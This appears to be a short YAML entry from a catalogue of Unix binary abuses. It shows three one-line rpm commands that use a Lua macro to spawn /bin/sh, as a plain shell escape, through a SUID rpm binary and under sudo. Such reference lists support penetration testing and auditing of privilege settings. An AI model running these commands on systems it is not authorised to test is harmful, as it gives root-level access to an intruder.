---
functions:
  shell:
    - code: rpm --eval '%{lua:posix.exec("/bin/sh")}'
  suid:
    - code: ./rpm --eval '%{lua:posix.exec("/bin/sh", "-p")}'
  sudo:
    - code: sudo rpm --eval '%{lua:posix.exec("/bin/sh")}'
---
